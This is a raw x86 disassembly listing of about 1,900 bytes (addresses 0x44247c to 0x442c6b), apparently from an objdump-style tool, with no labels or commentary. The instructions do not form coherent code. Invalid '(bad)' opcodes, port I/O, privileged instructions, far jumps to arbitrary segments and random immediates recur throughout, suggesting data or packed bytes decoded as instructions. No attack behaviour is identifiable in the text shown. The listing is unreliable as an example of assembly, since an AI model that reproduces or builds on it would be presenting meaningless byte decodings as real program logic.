  44247c:	jo     0x44248a
  44247e:	push   eax
  44247f:	mov    eax,ds:0x3984338b
  442484:	xlat   BYTE PTR gs:[ebx]
  442486:	inc    esi
  442487:	lods   eax,DWORD PTR ds:[esi]
  442488:	pop    esi
  442489:	test   ecx,ebx
  44248b:	xchg   esi,eax
  44248c:	rol    BYTE PTR [esi-0x19],1
  44248f:	push   esi
  442490:	aam    0x60
  442492:	jp     0x442425
  442494:	or     eax,0x76933deb
  442499:	mov    bl,0xec
  44249b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44249c:	or     al,0x19
  44249e:	push   ds
  44249f:	mov    bl,0xb1
  4424a1:	mov    eax,ds:0x40984c6e
  4424a6:	mov    ds:0xd7845ea8,eax
  4424ab:	jl     0x4424d5
  4424ad:	xchg   esp,eax
  4424ae:	jns    0x4424b5
  4424b0:	or     BYTE PTR [ecx+0x13],ah
  4424b3:	loope  0x4424fd
  4424b5:	jge    0x4424a0
  4424b7:	ror    edx,cl
  4424b9:	js     0x4424a8
  4424bb:	mov    BYTE PTR [ebx+0x4987b7de],ch
  4424c1:	sbb    ah,BYTE PTR [edx-0xc]
  4424c4:	push   bp
  4424c6:	cli    
  4424c7:	fst    DWORD PTR [ebx-0x1c]
  4424ca:	adc    al,0x91
  4424cc:	xor    DWORD PTR [eax+0x221d9f25],edi
  4424d2:	lods   al,BYTE PTR ds:[esi]
  4424d3:	pusha  
  4424d4:	mov    ecx,0x2a4ea802
  4424d9:	popa   
  4424da:	sbb    eax,0xb2025c01
  4424df:	mov    ecx,0x2aeef904
  4424e4:	jmp    0x8e0c:0x8fe5334
  4424eb:	mov    eax,ds:0x223aa3b5
  4424f0:	cdq    
  4424f1:	xchg   ecx,eax
  4424f2:	lock mov bl,BYTE PTR [esi+0x58]
  4424f6:	xchg   DWORD PTR [eax-0x27c4205],ebx
  4424fc:	adc    DWORD PTR [ecx-0x13],0xffffff89
  442500:	daa    
  442501:	adc    esp,DWORD PTR [eax-0x18]
  442504:	mov    eax,0x47612024
  442509:	sub    al,BYTE PTR [edi+0x13]
  44250c:	pop    esi
  44250d:	lods   eax,DWORD PTR ds:[esi]
  44250e:	push   eax
  44250f:	fisttp DWORD PTR [ecx+0x5a8ee171]
  442515:	inc    ebx
  442516:	sub    DWORD PTR [esi+0x266e6182],esi
  44251c:	retf   
  44251d:	add    BYTE PTR [edi-0xc],bl
  442520:	inc    esp
  442521:	push   0xffffffee
  442523:	xor    edi,eax
  442525:	lahf   
  442526:	out    dx,eax
  442527:	ds call 0x323bcb37
  44252d:	popa   
  44252e:	fadd   QWORD PTR [edx]
  442530:	rol    dl,1
  442532:	cmp    al,0x80
  442534:	(bad)  
  442535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442536:	out    dx,al
  442537:	or     ah,0x96
  44253a:	pop    es
  44253b:	int    0x79
  44253d:	dec    edi
  44253e:	stos   DWORD PTR es:[edi],eax
  44253f:	mov    eax,ds:0x9dfe36b9
  442544:	inc    ecx
  442545:	jno    0x442589
  442547:	and    ax,0x6ca9
  44254b:	pop    edi
  44254c:	fs (bad) 
  44254e:	das    
  44254f:	aas    
  442550:	dec    edx
  442551:	mov    eax,ds:0x68a06934
  442556:	mov    al,0xa0
  442558:	xor    cl,BYTE PTR [ecx-0x42b6f2be]
  44255e:	dec    ebp
  44255f:	xchg   edx,eax
  442560:	pop    esi
  442561:	or     BYTE PTR [eax+0x72],dl
  442564:	mov    eax,ds:0xd0e914be
  442569:	pusha  
  44256a:	add    BYTE PTR [edi],bh
  44256c:	adc    al,0x3b
  44256e:	and    edx,edi
  442570:	fwait
  442571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442572:	out    dx,al
  442573:	adc    eax,0xc4c2fea8
  442578:	push   0x189eb0ee
  44257d:	pop    eax
  44257e:	pop    ds
  44257f:	mov    bl,0x1e
  442581:	stos   BYTE PTR es:[edi],al
  442582:	and    al,0x7f
  442584:	adc    ebx,DWORD PTR [ebx]
  442586:	out    dx,al
  442587:	inc    edx
  442588:	push   ds
  442589:	cmp    al,0x79
  44258b:	xchg   edx,eax
  44258c:	xor    eax,0x69a197ec
  442591:	out    0x70,eax
  442593:	xor    eax,0x8b08a851
  442598:	pop    esi
  442599:	repz jb 0x4425a9
  44259c:	sub    BYTE PTR [edi-0x54c14081],0xc5
  4425a3:	or     BYTE PTR [edi-0x255f145a],bh
  4425a9:	push   ds
  4425aa:	jno    0x4425fd
  4425ac:	sub    al,0x62
  4425ae:	mov    edi,0xd9e05ef7
  4425b3:	pop    ecx
  4425b4:	and    al,0xa1
  4425b6:	popa   
  4425b7:	xlat   BYTE PTR ds:[ebx]
  4425b8:	call   0xf68ac139
  4425bd:	pop    ecx
  4425be:	scas   al,BYTE PTR es:[edi]
  4425bf:	fmul   DWORD PTR [edi]
  4425c1:	push   ecx
  4425c2:	sub    BYTE PTR [edx+eax*1+0x7e],ch
  4425c6:	out    dx,al
  4425c7:	out    dx,al
  4425c8:	jmp    0x4425bf
  4425ca:	or     al,0xa9
  4425cc:	rcl    ebx,0xc7
  4425cf:	mov    eax,ds:0x50ba452b
  4425d4:	mov    ds:0xac54cc35,al
  4425d9:	aas    
  4425da:	out    dx,al
  4425db:	cdq    
  4425dc:	scas   eax,DWORD PTR es:[edi]
  4425dd:	lea    esi,[ebx-0x6]
  4425e0:	or     esp,DWORD PTR [edx-0x3f4ed675]
  4425e6:	adc    al,0xa1
  4425e8:	ret    0x8d11
  4425eb:	imul   edx,DWORD PTR [ebp+ebx*8-0x6c],0x35
  4425f0:	pop    esi
  4425f1:	cwde   
  4425f2:	stos   BYTE PTR es:[edi],al
  4425f3:	outs   dx,DWORD PTR ds:[esi]
  4425f4:	sub    dl,BYTE PTR [edi]
  4425f6:	imul   edi,DWORD PTR [esi+0x522260fa],0x97308a84
  442600:	push   0xffffffc6
  442602:	out    dx,al
  442603:	stos   BYTE PTR es:[edi],al
  442604:	lock out 0x62,eax
  442607:	jge    0x4425cb
  442609:	adc    dh,BYTE PTR [ebx-0x23]
  44260c:	jmp    FWORD PTR [ecx]
  44260e:	out    dx,al
  44260f:	pushf  
  442610:	mov    cl,0xf9
  442612:	shl    ah,1
  442614:	or     ebx,DWORD PTR [edx+0x60]
  442617:	add    eax,0x35fda5f
  44261c:	inc    ebp
  44261d:	add    esi,DWORD PTR [eax-0x7f]
  442620:	mov    DWORD PTR [esi-0x13fa5ea8],eax
  442626:	loopne 0x442689
  442628:	ja     0x442632
  44262a:	inc    eax
  44262b:	aam    0x60
  44262d:	sbb    DWORD PTR [edx+esi*2],edi
  442630:	adc    ch,bl
  442632:	xchg   ebx,eax
  442633:	rcr    BYTE PTR [esi+0x5d],1
  442636:	sahf   
  442637:	out    0x32,al
  442639:	mov    ecx,0xe49ccdee
  44263e:	fsub   st(4),st
  442640:	jecxz  0x442698
  442642:	out    0xa2,eax
  442644:	cmp    esi,esi
  442646:	imul   edi,DWORD PTR [edx+0x276eeb09],0xffffffb0
  44264d:	push   ds
  44264e:	sub    BYTE PTR [ebx],dl
  442650:	pop    ecx
  442651:	lods   al,BYTE PTR ds:[esi]
  442652:	popf   
  442653:	jmp    0x442620
  442655:	xor    al,0x67
  442657:	out    dx,eax
  442658:	ds js  0x4426d1
  44265b:	mov    ds:0xa18f29c6,eax
  442660:	mov    esi,0x195663d7
  442665:	sbb    esp,DWORD PTR [eax]
  442667:	dec    edx
  442668:	pusha  
  442669:	cmp    al,0xbf
  44266b:	mov    ecx,0x217ba6fe
  442670:	mov    esi,0x11baafd2
  442675:	popa   
  442676:	ins    DWORD PTR es:[edi],dx
  442677:	sar    BYTE PTR [esi-0x17500582],cl
  44267d:	or     DWORD PTR [eax],eax
  44267f:	xchg   edx,eax
  442680:	xchg   ebx,eax
  442681:	mov    dh,0xff
  442683:	jmp    0x60c1b4a6
  442688:	stos   DWORD PTR es:[edi],eax
  442689:	dec    ebp
  44268a:	mov    dl,0xa0
  44268c:	std    
  44268d:	mov    ds:0x67b2824e,al
  442692:	(bad)  
  442693:	retf   0xec5d
  442696:	ret    0x2fb2
  442699:	jmp    0x442674
  44269b:	aad    0x2e
  44269d:	adc    DWORD PTR [ecx-0x6d],ebp
  4426a0:	and    al,0x3c
  4426a2:	push   edx
  4426a3:	mov    eax,ds:0xc732463c
  4426a8:	cmp    ecx,DWORD PTR [ebx]
  4426aa:	out    dx,al
  4426ab:	xor    eax,0x4c9a5674
  4426b0:	xchg   esp,eax
  4426b1:	retf   
  4426b2:	pop    eax
  4426b3:	mov    eax,ds:0x903bbb70
  4426b8:	sahf   
  4426b9:	mov    dh,BYTE PTR [edi+ecx*1]
  4426bc:	pop    esi
  4426bd:	into   
  4426be:	out    dx,eax
  4426bf:	add    DWORD PTR [edi+0x5854f300],ebp
  4426c5:	popa   
  4426c6:	popf   
  4426c7:	sub    dl,BYTE PTR [ebx+0x7e1c4dc5]
  4426cd:	dec    ebp
  4426ce:	out    0xab,eax
  4426d0:	pop    edx
  4426d1:	in     al,dx
  4426d2:	xor    al,0x3e
  4426d4:	mov    esi,0x412d7668
  4426d9:	push   edx
  4426da:	jno    0x44269f
  4426dc:	int3   
  4426dd:	(bad)  
  4426df:	cmc    
  4426e0:	sbb    al,0x8a
  4426e2:	fisub  WORD PTR [ebp+0x5e]
  4426e5:	or     cl,BYTE PTR [esp+edi*8-0x36729359]
  4426ec:	push   ebx
  4426ed:	push   ebx
  4426ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4426ef:	addr16 je 0x4426de
  4426f2:	rcl    ebx,cl
  4426f4:	pop    esi
  4426f5:	gs inc eax
  4426f7:	das    
  4426f8:	pop    ss
  4426f9:	and    bh,0xe6
  4426fc:	loopne 0x44274f
  4426fe:	mov    ds:0x98c11465,eax
  442703:	loope  0x44273c
  442705:	jge    0x442689
  442707:	mov    eax,ds:0xc2c3260b
  44270c:	add    al,0x11
  44270e:	jnp    0x4426a7
  442710:	pop    esi
  442711:	adc    esp,DWORD PTR [ebx+edi*2]
  442714:	xchg   esp,eax
  442715:	not    BYTE PTR [ebx-0xba06af6]
  44271b:	pop    ds
  44271c:	mov    ecx,0x4d666804
  442721:	popf   
  442722:	in     al,0x51
  442724:	push   edx
  442725:	adc    BYTE PTR [edx-0x5d],ch
  442728:	xor    al,0x61
  44272a:	sub    eax,0x5ce72b63
  44272f:	and    BYTE PTR [ecx+0x61],cl
  442732:	sub    al,BYTE PTR [edi+0x1905098a]
  442738:	xlat   BYTE PTR es:[ebx]
  44273a:	out    dx,al
  44273b:	out    0x68,eax
  44273d:	xor    BYTE PTR [ebp-0x9],ah
  442740:	out    dx,al
  442741:	loope  0x442751
  442743:	mov    eax,ds:0xdd4b7c05
  442748:	pop    ss
  442749:	pop    eax
  44274a:	jge    0x442795
  44274c:	pop    esi
  44274d:	jmp    0x6168:0x9fdd974c
  442754:	push   ebx
  442755:	gs aam 0xa
  442758:	ficomp WORD PTR [esi-0x6]
  44275b:	lods   eax,DWORD PTR ds:[esi]
  44275c:	out    0xa4,eax
  44275e:	test   eax,0xe7fff0f8
  442763:	inc    eax
  442764:	test   BYTE PTR [edi+0x44],bh
  442767:	je     0x4427d9
  442769:	repz inc edi
  44276b:	xlat   BYTE PTR ds:[ebx]
  44276c:	aam    0x60
  44276e:	and    eax,0xc313975f
  442773:	in     al,0x5e
  442775:	jle    0x4427f3
  442777:	aas    
  442778:	popa   
  442779:	pop    ecx
  44277a:	arpl   WORD PTR [esi-0x34],sp
  44277d:	push   ecx
  44277e:	jbe    0x4427d3
  442780:	test   eax,0x7d272dac
  442785:	add    DWORD PTR [ebx],0xfb79ccc1
  44278b:	aam    0xd7
  44278d:	daa    
  44278e:	out    dx,al
  44278f:	ds enter 0xb7ae,0x97
  442794:	xchg   BYTE PTR [eax+0x3a],ah
  442797:	cmp    BYTE PTR [eax+ecx*1],dh
  44279a:	jo     0x442816
  44279c:	cmp    al,0xd7
  44279e:	in     eax,dx
  44279f:	inc    BYTE PTR [edx+0x4ab71a23]
  4427a5:	cmp    al,0x66
  4427a7:	and    al,0x91
  4427a9:	pusha  
  4427aa:	add    bh,dl
  4427ac:	dec    edi
  4427ad:	gs cld 
  4427af:	dec    edi
  4427b0:	xchg   esi,eax
  4427b1:	shr    bh,1
  4427b3:	mov    ebp,0xa109982b
  4427b8:	fidivr WORD PTR [edx+0x6121b0ba]
  4427be:	jo     0x4427a5
  4427c0:	repz push ebx
  4427c2:	cmp    ebx,edi
  4427c4:	dec    eax
  4427c5:	sbb    DWORD PTR [edx+0x59],edx
  4427c8:	pop    ecx
  4427c9:	mov    esp,0x78d502b3
  4427ce:	cs js  0x442809
  4427d1:	inc    edi
  4427d2:	cmp    ebx,DWORD PTR [edi-0x46089be3]
  4427d8:	jle    0x442826
  4427da:	dec    eax
  4427db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4427dc:	sbb    ch,bh
  4427de:	cld    
  4427df:	lods   al,BYTE PTR ds:[esi]
  4427e0:	popa   
  4427e1:	jmp    0xe3a289e5
  4427e6:	test   eax,edx
  4427e8:	sub    dh,bl
  4427ea:	cmp    DWORD PTR [esi+ebp*2+0x5d43291c],ebx
  4427f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4427f2:	dec    esi
  4427f3:	stos   BYTE PTR es:[edi],al
  4427f4:	idiv   BYTE PTR [edi+eax*1+0x15515ed3]
  4427fb:	aas    
  4427fc:	loopne 0x442831
  4427fe:	ja     0x4427e5
  442800:	add    ah,BYTE PTR [ecx+0x5f]
  442803:	fxch   st(1)
  442805:	fld    DWORD PTR [eax]
  442807:	push   ebx
  442808:	test   DWORD PTR [ebp-0x57cbc312],ecx
  44280e:	xor    eax,0x76577f0f
  442813:	mov    eax,ds:0xab110631
  442818:	fsubr  st,st(4)
  44281a:	shr    DWORD PTR [eax+eiz*2+0x6a],1
  44281e:	ret    0x463d
  442821:	int3   
  442822:	dec    edi
  442823:	sub    BYTE PTR [ebp+edx*4+0x37],0x51
  442828:	jns    0x442881
  44282a:	sti    
  44282b:	mov    al,ds:0xcf75545f
  442830:	ja     0x4427de
  442832:	pop    ebx
  442833:	jecxz  0x442893
  442835:	jp     0x4427d7
  442837:	retf   0x323d
  44283a:	sbb    dh,BYTE PTR ds:0x29ea5eab
  442840:	dec    esi
  442841:	cld    
  442842:	sbb    DWORD PTR [edi+0x1e],edi
  442845:	cmp    DWORD PTR [edi-0x282aa076],esi
  44284b:	sub    esi,0xffffffd6
  44284e:	stos   BYTE PTR es:[edi],al
  44284f:	adc    ecx,edx
  442851:	mov    ecx,0x43aa6436
  442856:	das    
  442857:	lods   al,BYTE PTR ds:[esi]
  442858:	leave  
  442859:	and    BYTE PTR [esi],bl
  44285b:	jmp    0x2ea30f60
  442860:	pop    esi
  442861:	pop    ss
  442862:	popa   
  442863:	adc    BYTE PTR [ebp+0x12],cl
  442866:	outs   dx,DWORD PTR ds:[esi]
  442867:	scas   eax,DWORD PTR es:[edi]
  442868:	ret    0xd951
  44286b:	sub    BYTE PTR [ebp-0x410d5038],dl
  442871:	shr    BYTE PTR [ebx+esi*4],1
  442874:	fist   WORD PTR [ebx+0x74d5fcee]
  44287a:	add    BYTE PTR ds:0x8f944709,0xe1
  442881:	es inc eax
  442883:	and    esi,ebp
  442885:	xor    bh,al
  442887:	paddd  mm6,QWORD PTR ds:0x16fd30ed
  44288e:	fisub  DWORD PTR [eax]
  442890:	fsubr  st(1),st
  442892:	dec    edx
  442893:	outs   dx,BYTE PTR ds:[esi]
  442894:	xor    esp,DWORD PTR [edx]
  442896:	pop    esi
  442897:	mov    eax,ds:0x91abeda2
  44289c:	push   eax
  44289d:	xor    esp,DWORD PTR [eax-0x6305a10e]
  4428a3:	push   edi
  4428a4:	rcr    DWORD PTR [ecx+esi*8+0x12bf468b],0x8f
  4428ac:	jg     0x4428fe
  4428ae:	push   edi
  4428af:	mov    eax,ds:0x7fc45603
  4428b4:	daa    
  4428b5:	xor    eax,0xf9ad5bee
  4428ba:	and    ebp,DWORD PTR [ebx-0x5f58da5e]
  4428c0:	fidivr WORD PTR [eax+0x31]
  4428c3:	mov    al,ds:0x151bdfe4
  4428c8:	xor    ebp,ebx
  4428ca:	adc    BYTE PTR [ecx],ah
  4428cc:	mov    es,WORD PTR [edx+esi*4-0x13]
  4428d0:	and    al,0xe1
  4428d2:	mov    WORD PTR [eax-0x252f5619],fs
  4428d8:	mov    esi,0x15bd078a
  4428dd:	xlat   BYTE PTR ds:[ebx]
  4428de:	loope  0x44294d
  4428e0:	pop    edx
  4428e1:	jnp    0x4428f2
  4428e3:	aad    0xa4
  4428e5:	push   esi
  4428e6:	cs stos DWORD PTR es:[edi],eax
  4428e8:	sub    edi,ebp
  4428ea:	cmp    esp,DWORD PTR [ecx-0xd048f56]
  4428f0:	sub    BYTE PTR [eax+0x1b533f31],ch
  4428f6:	mov    ds:0x6ee6d216,eax
  4428fb:	mov    bh,dh
  4428fd:	mov    al,0x98
  4428ff:	xor    al,0x42
  442901:	popa   
  442902:	je     0x44288b
  442904:	cld    
  442905:	jg     0x44296f
  442907:	int    0x6b
  442909:	inc    ebx
  44290a:	out    dx,al
  44290b:	mov    ds:0xf6e930d7,eax
  442910:	aaa    
  442911:	inc    edx
  442912:	fistp  WORD PTR [edi-0x5d63d17b]
  442918:	mov    edi,0x9e3e4e7b
  44291d:	cmc    
  44291e:	pop    ecx
  44291f:	jge    0x442973
  442921:	push   es
  442922:	lahf   
  442923:	jecxz  0x442983
  442925:	jp     0x442916
  442927:	stc    
  442928:	push   edi
  442929:	xchg   DWORD PTR [ebp+0x3ce5f7a2],edx
  44292f:	(bad)  
  442930:	cmp    eax,0x296129a4
  442935:	sbb    dh,ch
  442937:	xor    ah,BYTE PTR [edx+ebx*2-0x6f4a45b5]
  44293e:	js     0x4428e1
  442940:	inc    ebx
  442941:	push   esi
  442942:	mov    ebp,0xe2b03499
  442947:	leave  
  442948:	pop    esi
  442949:	sbb    eax,0xeb369967
  44294e:	mov    al,ds:0xa760e0e4
  442953:	sti    
  442954:	std    
  442955:	xchg   edi,eax
  442956:	cli    
  442957:	sbb    ecx,DWORD PTR [ebx+0x42]
  44295a:	out    dx,al
  44295b:	ds in  eax,dx
  44295d:	mov    edi,DWORD PTR fs:[edx-0x45]
  442961:	aam    0xbf
  442963:	mov    al,ds:0x9ff83492
  442968:	pop    ds
  442969:	or     eax,0x96d6cc1b
  44296e:	out    dx,al
  44296f:	es in  eax,0xe1
  442972:	ds cmp esp,edi
  442975:	imul   eax,DWORD PTR [esi-0x207d9658],0xabda48db
  44297f:	adc    BYTE PTR ds:0x31624613,ah
  442985:	xchg   ecx,eax
  442986:	mov    dl,0xa0
  442988:	aaa    
  442989:	mov    dl,0xfc
  44298b:	aam    0x75
  44298d:	out    dx,eax
  44298e:	sbb    DWORD PTR [ecx+0x2c43b370],esp
  442994:	aad    0x96
  442996:	shl    ah,cl
  442998:	jmp    0x4eab:0xcb79e72b
  44299f:	xor    ch,dh
  4429a1:	push   cs
  4429a2:	adc    bl,BYTE PTR [edx]
  4429a4:	hlt    
  4429a5:	push   edx
  4429a6:	and    DWORD PTR [esi],ecx
  4429a8:	push   esp
  4429a9:	lea    ebp,[esi+0x3718174c]
  4429af:	iret   
  4429b0:	fs jmp 0x44299e
  4429b3:	jb     0x442a1a
  4429b5:	mov    eax,ds:0xafeb3
  4429ba:	ins    BYTE PTR es:[edi],dx
  4429bb:	leave  
  4429bc:	mov    ah,0xdb
  4429be:	out    dx,al
  4429bf:	pop    edx
  4429c0:	add    DWORD PTR [edx+0x7a9ed47e],0x23
  4429c7:	into   
  4429c8:	aas    
  4429c9:	pusha  
  4429ca:	stos   DWORD PTR es:[edi],eax
  4429cb:	sub    eax,0x8a60766
  4429d0:	ja     0x442959
  4429d2:	push   cs
  4429d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4429d4:	jb     0x4429c7
  4429d6:	xchg   DWORD PTR [ecx-0xa524869],esp
  4429dc:	adc    esi,ebp
  4429de:	xchg   esp,eax
  4429df:	daa    
  4429e0:	xor    esi,DWORD PTR [edx]
  4429e2:	dec    edx
  4429e3:	mov    eax,ds:0x7f356c6e
  4429e8:	mov    eax,0x2e1ab87
  4429ee:	in     eax,dx
  4429ef:	mov    edx,0x3b1f6990
  4429f4:	fisttp QWORD PTR [ecx+ecx*8+0x770f5e0e]
  4429fb:	xlat   BYTE PTR ss:[ebx]
  4429fd:	cld    
  4429fe:	jns    0x4429dc
  442a00:	add    DWORD PTR [ecx+0x14],esp
  442a03:	sbb    ax,0x7332
  442a07:	fsubr  DWORD PTR [ebp-0x69]
  442a0a:	jmp    0x442a47
  442a0c:	ja     0x44299e
  442a0e:	cs or  al,0x32
  442a11:	rcl    edi,0x2f
  442a14:	jmp    DWORD PTR [esi-0x3d]
  442a17:	xor    al,0x5e
  442a19:	mov    ds:0x8091164b,al
  442a1e:	addr16 sub al,0x60
  442a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442a22:	stos   BYTE PTR es:[edi],al
  442a23:	adc    BYTE PTR [edx+0x1e6fb325],0x1c
  442a2a:	(bad)  
  442a2b:	mov    cl,0x5e
  442a2d:	sbb    BYTE PTR [ecx+0x15],ah
  442a30:	xchg   ebx,eax
  442a31:	sub    DWORD PTR [ebx],0xffffff83
  442a34:	pop    ebx
  442a35:	pop    esi
  442a36:	(bad)  
  442a37:	jns    0x442a86
  442a39:	cmp    eax,0x5e6e5313
  442a3e:	add    DWORD PTR [edi+0x5e],ebx
  442a41:	rol    DWORD PTR [edi-0x38],1
  442a44:	jmp    0x442a7f
  442a46:	cmp    edi,DWORD PTR [ebx-0x34b79f95]
  442a4c:	addr16 aas 
  442a4e:	loopne 0x442a22
  442a50:	loopne 0x442a6e
  442a52:	out    dx,al
  442a53:	jne    0x442a01
  442a55:	xchg   edx,eax
  442a56:	(bad)  
  442a57:	mul    BYTE PTR [edx-0x59652274]
  442a5d:	mov    ds:0x6098e3cf,eax
  442a62:	push   esp
  442a63:	daa    
  442a64:	lock shr ebp,0xe0
  442a68:	pop    esi
  442a69:	dec    esi
  442a6a:	inc    ebx
  442a6b:	mov    esp,0xf194a0de
  442a70:	or     ah,BYTE PTR [ecx-0x63]
  442a73:	cmc    
  442a74:	stc    
  442a75:	sar    BYTE PTR [ecx-0x1478a909],cl
  442a7b:	pop    ebp
  442a7c:	inc    ebx
  442a7d:	(bad)  
  442a7e:	sar    BYTE PTR [ebx+ebx*1-0x37],0x18
  442a83:	adc    bl,BYTE PTR [ecx]
  442a85:	popa   
  442a86:	cmp    eax,0xc5d54120
  442a8b:	loop   0x442ada
  442a8d:	aas    
  442a8e:	out    dx,al
  442a8f:	nop
  442a90:	sub    esp,DWORD PTR [eax+edx*4+0x44]
  442a94:	pop    ss
  442a95:	shl    bh,1
  442a97:	mov    al,ds:0x6957c38a
  442a9c:	dec    eax
  442a9d:	lds    ecx,FWORD PTR ds:0xd5115e6c
  442aa3:	leave  
  442aa4:	dec    edi
  442aa5:	or     DWORD PTR [edi-0x9ef691],0x78
  442aac:	out    0xc,eax
  442aae:	sub    bh,BYTE PTR [ebx-0x37]
  442ab1:	cmp    al,0xee
  442ab3:	xor    al,0x73
  442ab5:	loopne 0x442a97
  442ab7:	ret    
  442ab8:	inc    edi
  442ab9:	sbb    BYTE PTR ds:0x4fd94ba1,0xcf
  442ac0:	mov    bl,0x30
  442ac2:	js     0x442ae3
  442ac4:	fs daa 
  442ac6:	out    0x1,eax
  442ac8:	lods   al,BYTE PTR ds:[esi]
  442ac9:	inc    eax
  442aca:	add    eax,0x2c20b2e0
  442acf:	(bad)  
  442ad0:	xor    edx,DWORD PTR ds:0x5cdbac21
  442ad6:	push   0x75c09b35
  442adb:	mov    al,ds:0xaee948d
  442ae0:	jmp    0x442aad
  442ae2:	pop    ebx
  442ae3:	sar    al,1
  442ae5:	jbe    0x442b45
  442ae7:	mov    eax,ds:0xb29ea145
  442aec:	jnp    0x442aec
  442aee:	pop    edi
  442aef:	push   0x52c2a55a
  442af4:	bound  ebp,QWORD PTR ds:0xe937782e
  442afa:	(bad)  
  442afb:	mov    ds:0x517b1c6d,eax
  442b00:	stc    
  442b01:	stos   BYTE PTR es:[edi],al
  442b02:	jle    0x442b17
  442b04:	adc    dl,BYTE PTR [edx-0x27732e11]
  442b0a:	fwait
  442b0b:	add    BYTE PTR [esi],cl
  442b0d:	or     DWORD PTR [eax+0x32a48d],0x1e00eba1
  442b17:	jnp    0x442b21
  442b19:	loopne 0x442af7
  442b1b:	leave  
  442b1c:	pop    esi
  442b1d:	push   edi
  442b1e:	push   0x60
  442b20:	cdq    
  442b21:	mov    al,ds:0x61566586
  442b26:	rcl    DWORD PTR [ebp-0x18],0x3d
  442b2a:	pushw  0x687b
  442b2e:	out    dx,al
  442b2f:	pop    edx
  442b30:	cmp    DWORD PTR [esi-0x3d2833cf],esp
  442b36:	inc    eax
  442b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442b38:	in     al,dx
  442b39:	in     eax,0x81
  442b3b:	in     al,dx
  442b3c:	sbb    DWORD PTR [ecx-0x17c98a14],esp
  442b42:	out    dx,al
  442b43:	(bad)  
  442b44:	sahf   
  442b45:	xchg   edi,eax
  442b46:	inc    ecx
  442b47:	stos   BYTE PTR es:[edi],al
  442b48:	into   
  442b49:	or     ecx,DWORD PTR [esi+0x1ff22fa1]
  442b4f:	and    DWORD PTR [edx+0x5e6cbdf6],ebx
  442b55:	mov    eax,0x745f2c4c
  442b5a:	inc    edi
  442b5b:	sbb    edx,edx
  442b5d:	pusha  
  442b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442b5f:	add    al,0xaa
  442b61:	push   esi
  442b62:	adc    ecx,DWORD PTR [ebp-0xc11b158]
  442b68:	mov    esp,DWORD PTR [ebx-0x2e]
  442b6b:	sbb    eax,0xab908815
  442b70:	xchg   esp,eax
  442b71:	or     dh,ch
  442b73:	in     eax,0xdb
  442b75:	mov    ds:0xc0ec9ce9,al
  442b7a:	out    dx,al
  442b7b:	mov    WORD PTR [eax+0x33],fs
  442b7e:	cmp    eax,0xe4570ac
  442b83:	out    dx,al
  442b84:	shl    BYTE PTR [eax+0x4f],0xcb
  442b88:	sub    BYTE PTR [eax-0x51],ah
  442b8b:	nop
  442b8c:	mov    edi,0xa761eed8
  442b91:	aad    0x32
  442b93:	or     al,0x45
  442b95:	loopne 0x442b78
  442b97:	int3   
  442b98:	dec    edx
  442b99:	in     al,0xe7
  442b9b:	std    
  442b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442b9d:	jo     0x442b3c
  442b9f:	scas   eax,DWORD PTR es:[edi]
  442ba0:	jae    0x442c02
  442ba2:	cwde   
  442ba3:	mov    ebx,0x11fc899e
  442ba8:	pop    esi
  442ba9:	outs   dx,BYTE PTR ds:[esi]
  442baa:	xchg   BYTE PTR [esp+edi*1-0x19],al
  442bae:	(bad)  
  442baf:	inc    ch
  442bb1:	and    ecx,DWORD PTR [edi+0x6368b69c]
  442bb7:	shl    bl,cl
  442bb9:	mov    edi,0x871c1bae
  442bbe:	jb     0x442b5f
  442bc0:	push   ebx
  442bc1:	sahf   
  442bc2:	or     BYTE PTR [eax],al
  442bc4:	sahf   
  442bc5:	sub    ecx,DWORD PTR [ecx-0x4f]
  442bc8:	stos   BYTE PTR es:[edi],al
  442bc9:	loopne 0x442bd9
  442bcb:	mov    eax,ds:0xd9e08d8
  442bd0:	in     eax,0xf2
  442bd2:	sub    eax,0x6b7b5eb8
  442bd7:	jmp    0x615d:0xd545f5ea
  442bde:	jl     0x442b7d
  442be0:	ss pop ds
  442be2:	mov    al,0x6c
  442be4:	inc    ecx
  442be5:	xchg   esi,eax
  442be6:	loop   0x442bf5
  442be8:	pop    esi
  442be9:	adc    al,0x55
  442beb:	and    eax,0x6da9ccc4
  442bf0:	xlat   BYTE PTR ds:[ebx]
  442bf1:	pusha  
  442bf2:	ss ror al,cl
  442bf5:	mov    edi,0x927399a0
  442bfa:	and    eax,0x7d60768f
  442bff:	inc    ebx
  442c00:	add    eax,0x8578e06f
  442c05:	pusha  
  442c06:	in     al,0x4d
  442c08:	mov    BYTE PTR [esi-0x7ddf77af],0xee
  442c0f:	adc    BYTE PTR ds:0x7895cae0,bh
  442c15:	leave  
  442c16:	leave  
  442c17:	mov    al,ds:0x13ea7167
  442c1c:	xlat   BYTE PTR ds:[ebx]
  442c1d:	pop    edx
  442c1e:	mov    bl,0x55
  442c20:	pop    esi
  442c21:	mov    edi,0x7306517e
  442c26:	daa    
  442c27:	lahf   
  442c28:	add    BYTE PTR [eax-0x5],ah
  442c2b:	cmp    cl,bh
  442c2d:	pop    ecx
  442c2e:	cmp    BYTE PTR [ebp-0x20],0xbc
  442c32:	jae    0x442c0f
  442c34:	adc    bh,BYTE PTR [ebx]
  442c36:	and    BYTE PTR [ecx+0x1da384c0],0x30
  442c3d:	sub    edi,eax
  442c3f:	mov    al,ds:0xc48a574f
  442c44:	inc    ebx
  442c45:	inc    ebp
  442c46:	pop    edx
  442c47:	mov    dl,dh
  442c49:	push   edi
  442c4a:	mov    dh,0xe4
  442c4c:	mov    ebp,0xa9380960
  442c51:	sbb    eax,DWORD PTR [ebx+edx*1+0x7fcc60b7]
  442c58:	jg     0x442cbc
  442c5a:	rcr    DWORD PTR [esi-0x7a12a864],0x72
  442c61:	add    eax,0x93a5aa6f
  442c66:	push   cs
  442c67:	in     al,dx
  442c68:	sbb    BYTE PTR [ecx-0x31],ah
  442c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
